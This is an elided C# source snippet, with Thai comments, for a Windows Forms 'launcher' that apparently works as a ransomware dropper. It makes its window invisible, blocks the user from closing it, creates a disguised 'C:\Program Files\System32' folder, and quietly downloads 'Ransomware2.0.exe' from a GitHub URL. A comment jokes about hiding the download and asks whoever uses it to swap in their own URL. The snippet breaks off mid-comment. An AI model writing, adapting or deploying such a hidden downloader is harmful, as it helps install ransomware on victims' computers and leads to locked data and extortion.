...
namespace launcher2._0
{
    public partial class launcher2 : Form
    {
        ...
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor; //ทำให้มองไม่เห็น 
        }

        private void launcher2_FormClosing(object sender, FormClosingEventArgs e)
        {

            e.Cancel = true; //กดปิดไม่ได้
        ...
        private void launcher2_Load(object sender, EventArgs e)
        {
            ...
            Directory.CreateDirectory("C:\\Program Files\\System32"); //สร้างโฟ
            ...
            webClient.DownloadFile("https://github.com/Aossser/Auoo_main/raw/main/Ransomware2.0.exe", @"C:\Program Files\System32\Ransomware2.0.exe"); //Hide donwloading :-), please change url to your 
